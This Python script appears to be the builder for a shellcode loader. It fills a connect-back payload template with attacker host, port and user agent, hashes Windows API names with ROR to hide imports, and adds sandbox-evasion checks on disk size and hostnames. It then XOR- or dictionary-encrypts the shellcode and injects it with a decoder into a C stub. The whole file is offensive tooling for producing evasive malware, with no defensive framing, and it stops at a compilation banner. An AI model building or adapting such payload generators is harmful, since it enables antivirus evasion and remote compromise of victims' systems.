from configparser import ConfigParser
from scripts.ROR import hash
from scripts.config import parse_config
from scripts.dict import dictionary_encrypt
from scripts.utils import *
import random
import sys

config = ConfigParser()
config.read(".conf") 

# CONFIG = parse_config(config)

ENCRYPTION_METHOD = config.get("Payload", "encryption_method")
ROR_VALUE = config.getint("Payload", "ror_value")
ENCRYPTION_KEY = config.get("Payload", "encryption_key")
PAYLOAD_FILE = config.get("Payload", "file")

LHOST = config.get("Payload", "lhost")
LPORT = config.getint("Payload", "lport")
USER_AGENT = config.get("Payload","user_agent")

STUB_FILE = config.get("Stub", "filename")

DISK_SIZE = config.get("Anti-Analysis", "disk_size")
TARGET_HOSTNAME = config.get("Anti-Analysis", "target_hostname")
AVOID_HOSTNAME = config.get("Anti-Analysis", "avoid_hostname").split(",")
if len(AVOID_HOSTNAME) == 1 and AVOID_HOSTNAME[0] == "":
    AVOID_HOSTNAME = []

WORKING_FOLDER = "temp/"


def main():

    if config.get("Payload", "encryption_key") == "rand":
        ENCRYPTION_KEY = random.randint(0x1111, 0xFFFF)
    else:
        ENCRYPTION_KEY = int(config.get("Payload", "encryption_key"),16)

    print("===========CONFIG==========")
    print(f"ROR value: {ROR_VALUE}")
    print(f"Encryption byte: {ENCRYPTION_KEY}")
    print(f"Payload file: {PAYLOAD_FILE}")
    print("===========================\n")

    print("===========PAYLOAD==============")
    if PAYLOAD_FILE.endswith(".nasm") or PAYLOAD_FILE.endswith(".asm"):
        sed_file(WORKING_FOLDER+PAYLOAD_FILE, "%ROR_VALUE%", hex(ROR_VALUE))
        
        sed_file(WORKING_FOLDER+PAYLOAD_FILE, "%LPORT%", hex(LPORT))
        sed_file(WORKING_FOLDER+PAYLOAD_FILE, "%LHOST%", LHOST.replace('"',''))
        sed_file(WORKING_FOLDER+PAYLOAD_FILE, "%USER-AGENT%", USER_AGENT.replace('"',''))

        if LHOST.count(".") == 3:
            sed_file(WORKING_FOLDER+PAYLOAD_FILE, "%LHOST__LPORT%", format_lhost_lport(LHOST,LPORT))

    all_tags = extract_tags_from_folder(WORKING_FOLDER)

    for file in all_tags:
        filename = file["filename"]
        tags = file["tags"]
        # Tags like %HASH__MODULE__FUNCTION% are replaced by their hash
        for tag in tags:
            parts = tag.replace("%", "").split("__")
            if parts[0] == "HASH":
                sed_file(WORKING_FOLDER+filename, tag, hex(hash(parts[1], parts[2], ROR_VALUE)))
            if parts[0] == "MODHASH":
                sed_file(WORKING_FOLDER+filename, tag, hash_obj(parts[1],""))
            if parts[0] == "FCTHASH":
                sed_file(WORKING_FOLDER+filename, tag, hash_obj("", parts[1]))
            if parts[0] == "RANDOM":
                # Générer une valeur aléatoire de 32 bits
                dword_value = random.randint(0, 0xFFFFFFF)
                sed_file(WORKING_FOLDER+filename, tag, hex(dword_value))
            if parts[0] == "SANDBOX":
                if parts[1] == "DISKSIZE":
                    sed_file(WORKING_FOLDER+filename, tag, DISK_SIZE)
                if parts[1] == "TARGET_HOSTNAME":
                    if len(TARGET_HOSTNAME):
                        sed_file(WORKING_FOLDER+filename, tag, hash_obj("",TARGET_HOSTNAME))
                        print("Target hostname: ", TARGET_HOSTNAME)
                    else:
                        sed_file(WORKING_FOLDER+filename, tag, "{0, 0, false}")
                if parts[1] == "AVOID_HOSTNAME":
                    if len(AVOID_HOSTNAME):
                        res = ""
                        for hostname in AVOID_HOSTNAME:
                            if hostname != "":
                                res += hash_obj("",hostname)+","
                        sed_file(WORKING_FOLDER+filename, tag, res[:-1])
                        print("Avoid hostnames: ", AVOID_HOSTNAME)
                    else:
                        sed_file(WORKING_FOLDER+filename, tag, "{0, 0, false}")


    if PAYLOAD_FILE.endswith(".nasm") or PAYLOAD_FILE.endswith(".asm"):
        instructions = nasm2instructions(WORKING_FOLDER+PAYLOAD_FILE)
    elif PAYLOAD_FILE.endswith(".bin") or PAYLOAD_FILE.endswith(".raw"):
        instructions = bin2instructions(WORKING_FOLDER+PAYLOAD_FILE)
    elif PAYLOAD_FILE.endswith(".txt"):
        instructions = txt2instructions(WORKING_FOLDER+PAYLOAD_FILE)
    else:
        print(f"Unknown file format of the payload : {PAYLOAD_FILE}")
        sys.exit(1)

    print("================================\n")



    # Encrypt the shellcode
    print("===========ENCRYPTION==============")
    
    if ENCRYPTION_METHOD == "dictionary" or ENCRYPTION_METHOD == "dict":
        print(f"\nEncrypted with dictionary\n")
        instructions, association_table, size_payload_phrase = dictionary_encrypt(instructions)

        sed_file("temp/definitions.h", "%PAYLOAD_SIZE%", str(round_pow2(size_payload_phrase)))
        sed_file("temp/payload.c", "%SHELLCODE%", f"unsigned char payload[];\n\n{association_table}\n\nconst char* dict_payload = {instructions};")
        sed_file(WORKING_FOLDER+STUB_FILE, "%SHELLCODE_DECODER%", "DICT_decrypt(dict_payload);")
    
    else:
        print(f"\nEncrypted with '{hex(ENCRYPTION_KEY)}' {int(len(instructions)/2)} bytes of instructions\n")
        encrypted_instructions = xor2_encrypt_decrypt(instructions, ENCRYPTION_KEY)

        sed_file("temp/definitions.h", "%PAYLOAD_SIZE%", str(int(len(instructions)/2)))
        sed_file("temp/payload.c", "%SHELLCODE%", f"unsigned char payload[] = \"{format_instructions(encrypted_instructions)}\";")
        sed_file(WORKING_FOLDER+STUB_FILE, "%SHELLCODE_DECODER%", "XOR(payload,sizeof(payload),key);")
    
    print("===================================\n")
    sed_file(WORKING_FOLDER+STUB_FILE, "%XOR_KEY%", str(ENCRYPTION_KEY))

    

    print("\n================COMPILATION===============")


if __name__ == "__main__":
    main()